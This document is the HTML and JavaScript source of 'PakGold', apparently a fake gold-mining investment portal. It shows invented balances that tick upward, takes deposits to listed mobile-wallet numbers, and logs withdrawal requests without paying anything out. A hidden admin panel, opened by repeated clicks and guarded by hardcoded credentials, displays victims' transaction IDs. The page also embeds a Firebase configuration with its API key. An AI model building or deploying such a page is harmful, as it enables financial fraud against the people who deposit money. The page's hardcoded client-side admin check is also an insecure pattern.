<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PakGold | Premium Investment Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #d4af37; --gold-dark: #b8860b; --dark: #1e272e; --success: #2ecc71; --purple: #8e44ad; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        body { background: #f4f7f6; color: var(--dark); overflow-x: hidden; }

        /* Navigation & Animations */
        .section { display: none; padding: 20px; animation: fadeIn 0.4s ease; min-height: 100vh; }
        .active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        /* UI Components */
        .card { background: white; padding: 20px; border-radius: 25px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 20px; text-align: center; }
        .btn-gold { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); color: white; border: none; padding: 15px; border-radius: 50px; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 8px 15px rgba(184,134,11,0.3); }
        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: 1px solid #ddd; outline: none; }
        
        /* Dashboard Header */
        .dash-header { background: var(--dark); color: white; padding: 45px 20px; border-radius: 0 0 35px 35px; text-align: center; }
        .balance-text { font-size: 2.8rem; color: var(--gold); margin: 10px 0; font-weight: 700; }

        /* Bottom Menu */
        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: white; display: none; justify-content: space-around; padding: 12px; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); z-index: 1000; border-top-left-radius: 25px; border-top-right-radius: 25px; }
        .nav-item { font-size: 0.7rem; color: #888; cursor: pointer; text-align: center; font-weight: 600; }
        .active-nav { color: var(--gold); }

        /* Admin Secret UI */
        #admin-auth { display:none; background: #f0ebf8; padding: 20px; border-radius: 20px; border: 2px dashed var(--purple); margin: 15px 0; }
        .admin-req { background: white; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-left: 6px solid var(--purple); font-size: 0.8rem; text-align: left; box-shadow: 0 5px 10px rgba(0,0,0,0.05); }

        /* Widgets */
        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--dark); color: white; padding: 10px 20px; border-radius: 50px; font-size: 0.8rem; z-index: 5000; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .wa-float { position: fixed; bottom: 85px; right: 20px; background: #25d366; color: white; padding: 12px 18px; border-radius: 50px; text-decoration: none; display: flex; align-items: center; gap: 8px; font-weight: bold; font-size: 0.85rem; box-shadow: 0 8px 20px rgba(0,0,0,0.2); z-index: 1001; }
    </style>
</head>
<body onload="checkSession()">

    <div id="toast">Request Received!</div>

    <!-- 1. LOGIN / SIGNUP SECTION -->
    <section id="auth-page" class="section active" style="text-align: center; padding-top: 12vh;">
        <h1 style="font-size: 3.5rem; color: var(--gold); font-weight: 800;">⚜️ PAKGOLD</h1>
        <p style="color: #888; margin-bottom: 25px;">Premium Cloud Mining & Security</p>
        <div class="card" style="max-width: 360px; margin: 0 auto;">
            <input type="text" id="u-phone" placeholder="Phone Number (03xxxxxxxxx)">
            <input type="password" id="u-pass" placeholder="Account Password">
            <button class="btn-gold" onclick="userLogin()">ACCESS VAULT</button>
            <p style="margin-top: 20px; font-size: 0.8rem; color: #bbb;">Secured by 256-bit Encryption 🔒</p>
        </div>
    </section>

    <!-- 2. DASHBOARD SECTION -->
    <section id="dash-page" class="section">
        <div class="dash-header">
            <h2 id="admin-trigger" onclick="handleSecret()" style="color: var(--gold); cursor: pointer; letter-spacing: 1px;">PAK GOLD SOLUTIONS</h2>
            <h1 class="balance-text" id="live-bal">₨ 0.0000</h1>
            <div style="background: rgba(46,204,113,0.1); color: var(--success); padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; display: inline-block;">Mining Node Active ⚡</div>
        </div>

        <div style="margin-top: 25px; padding-bottom: 110px;">
            <!-- Secret Admin Box -->
            <div id="admin-auth">
                <h3 style="color: var(--purple); margin-bottom: 10px;">🔐 Administration Portal</h3>
                <input type="text" id="adm-id" placeholder="Admin ID">
                <input type="password" id="adm-key" placeholder="Security Key">
                <button class="btn-gold" style="background: var(--purple);" onclick="adminLogin()">LOG IN AS QUEEN</button>
            </div>

            <!-- Dashboard Content -->
            <div id="user-main-content">
                <div class="card" onclick="nav('deposit-page')">
                    <h2 style="color: var(--gold); margin-bottom: 5px;">+ DEPOSIT</h2>
                    <p style="font-size: 0.75rem; color: #888;">Add balance via EasyPaisa / JazzCash / SadaPay</p>
                </div>

                <div class="card">
                    <h3>🎡 Daily Lucky Spin</h3>
                    <p style="font-size: 0.7rem; color: #888; margin-bottom: 15px;">Win up to ₨ 5,000 gold bonus daily</p>
                    <button class="btn-gold" onclick="luckySpin()">SPIN FOR FREE</button>
                </div>

                <div class="card">
                    <h3>👥 Team Referral</h3>
                    <div style="background: #f8f8f8; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin: 10px 0;">https://pakgold.com/ref/user_786</div>
                    <button class="btn-gold" style="background: #444; width: 150px; font-size: 0.8rem; padding: 10px;" onclick="msg('Link Copied, Sweetie!')">Copy Link</button>
                </div>

                <div class="card" style="background: #fff9e6; border: 1px dashed var(--gold);">
                    <h4 style="color: var(--gold-dark);">📜 Official Policy</h4>
                    <p style="font-size: 0.65rem; color: #888; margin-top: 8px;">Minimum withdrawal is ₨ 500. Verification takes 30-120 minutes. Fake TID accounts will be banned permanently.</p>
                </div>
            </div>

            <!-- Hidden Admin Panel Area -->
            <div id="admin-panel" style="display:none;">
                <h2 style="color: var(--purple); margin-bottom: 20px;">Live Requests Management</h2>
                <div id="live-requests-list">Waiting for user actions...</div>
                <button class="btn-gold" style="background: #ff4757; margin-top: 20px;" onclick="location.reload()">LOGOUT ADMIN</button>
            </div>
        </div>
    </section>

    <!-- 3. DEPOSIT SECTION -->
    <section id="deposit-page" class="section">
        <h2 style="margin-bottom: 20px;">Add Deposit</h2>
        <div class="card">
            <div style="text-align: left; font-size: 0.85rem; padding: 15px; background: #f0f2f5; border-radius: 15px; margin-bottom: 20px;">
                <p><b>Easypaisa:</b> 03379827882</p>
                <p><b>JazzCash / SadaPay:</b> 03705519562</p>
                <p style="color: var(--gold-dark); font-size: 0.7rem; margin-top: 5px;">*Take screenshot after payment & enter TID</p>
            </div>
            <input type="number" id="d-amt" placeholder="Amount (Min 500)">
            <select id="d-meth">
                <option>Select Payment Method</option>
                <option>EasyPaisa</option>
                <option>JazzCash</option>
                <option>SadaPay</option>
                <option>Binance USDT</option>
            </select>
            <input type="text" id="d-tid" placeholder="Transaction ID (TID)">
            <button class="btn-gold" onclick="submitRequest('Deposit')">CONFIRM DEPOSIT</button>
        </div>
    </section>

    <!-- 4. WITHDRAW SECTION -->
    <section id="withdraw-page" class="section">
        <h2 style="margin-bottom: 20px;">Request Withdrawal</h2>
        <div class="card">
            <input type="number" id="w-amt" placeholder="Amount (Min 500)">
            <input type="text" id="w-num" placeholder="Account Number">
            <input type="password" placeholder="4-Digit Withdraw PIN">
            <button class="btn-gold" style="background: var(--success);" onclick="submitRequest('Withdrawal')">WITHDRAW NOW</button>
        </div>
    </section>

    <!-- GLOBAL WIDGETS -->
    <div class="bottom-nav" id="main-nav">
        <div class="nav-item" onclick="nav('dash-page')">🏠<br>Home</div>
        <div class="nav-item" onclick="nav('deposit-page')">💰<br>Deposit</div>
        <div class="nav-item" onclick="nav('withdraw-page')">📤<br>Withdraw</div>
        <div class="nav-item" onclick="logoutUser()">🚪<br>Logout</div>
    </div>

    <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="wa-float" target="_blank">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="22">
        Support
    </a>

    <!-- THE ENGINE (FIREBASE + LOGIC) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- AUTH & NAVIGATION ---
        window.userLogin = function() {
            const p = document.getElementById('u-phone').value;
            if(p.length < 10) return msg("Valid phone please sweetie!");
            localStorage.setItem('pg_user', p);
            localStorage.setItem('pg_bal', 1250.00);
            nav('dash-page');
            startMining();
        }

        window.nav = function(id) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.getElementById('main-nav').style.display = (id==='auth-page') ? 'none' : 'flex';
        }

        window.checkSession = function() {
            if(localStorage.getItem('pg_user')) {
                nav('dash-page');
                startMining();
            }
        }

        window.logoutUser = function() {
            localStorage.clear();
            location.reload();
        }

        // --- MINING SYSTEM ---
        function startMining() {
            let balance = parseFloat(localStorage.getItem('pg_bal'));
            setInterval(() => {
                balance += 0.0011;
                localStorage.setItem('pg_bal', balance);
                const display = document.getElementById('live-bal');
                if(display) display.innerText = "₨ " + balance.toFixed(4);
            }, 1000);
        }

        // --- FIREBASE REQUESTS ---
        window.submitRequest = function(type) {
            const user = localStorage.getItem('pg_user');
            const amt = (type==='Deposit') ? document.getElementById('d-amt').value : document.getElementById('w-amt').value;
            const tid = (type==='Deposit') ? document.getElementById('d-tid').value : "WIT-"+Date.now();
            const meth = (type==='Deposit') ? document.getElementById('d-meth').value : "Bank";

            if(!amt || !tid) return msg("Please fill all fields!");

            push(ref(db, 'requests/'), {
                type: type,
                amount: amt,
                tid: tid,
                method: meth,
                user: user,
                status: "Pending",
                time: new Date().toLocaleString()
            }).then(() => {
                msg(type + " Request Submitted! 😘");
                nav('dash-page');
            });
        }

        // --- SECRET ADMIN SYSTEM ---
        let adminClicks = 0;
        window.handleSecret = function() {
            adminClicks++;
            if(adminClicks >= 5) {
                document.getElementById('admin-auth').style.display = 'block';
                document.getElementById('user-main-content').style.display = 'none';
                adminClicks = 0;
            }
        }

        window.adminLogin = function() {
            const id = document.getElementById('adm-id').value;
            const key = document.getElementById('adm-key').value;
            if(id === 'admin786' && key === 'gold_master_786') {
                document.getElementById('admin-auth').style.display = 'none';
                document.getElementById('admin-panel').style.display = 'block';
                loadLiveAdminData();
            } else { msg("Wrong Admin Keys!"); }
        }

        function loadLiveAdminData() {
            const reqRef = ref(db, 'requests/');
            onValue(reqRef, (snapshot) => {
                const list = document.getElementById('live-requests-list');
                list.innerHTML = "";
                snapshot.forEach((child) => {
                    const data = child.val();
                    list.innerHTML += `
                        <div class="admin-req">
                            <span style="color:var(--purple);font-weight:700;">[${data.type}]</span> 👤 ${data.user}<br>
                            <b>Amount:</b> ₨ ${data.amount} | <b>Method:</b> ${data.method}<br>
                            <b>TID:</b> <span style="background:#eee;padding:2px 5px;">${data.tid}</span><br>
                            <small>${data.time}</small>
                        </div>`;
                });
            });
        }

        // --- UTILS ---
        window.msg = function(text) {
            const t = document.getElementById('toast');
            t.innerText = text;
            t.style.display = 'block';
            setTimeout(() => t.style.display = 'none', 3000);
        }

        window.luckySpin = function() {
            let b = parseFloat(localStorage.getItem('pg_bal')) + 2.50;
            localStorage.setItem('pg_bal', b);
            msg("Aww! You won ₨ 2.50 Gold Bonus! 💋");
        }
    </script>
</body>
</html>
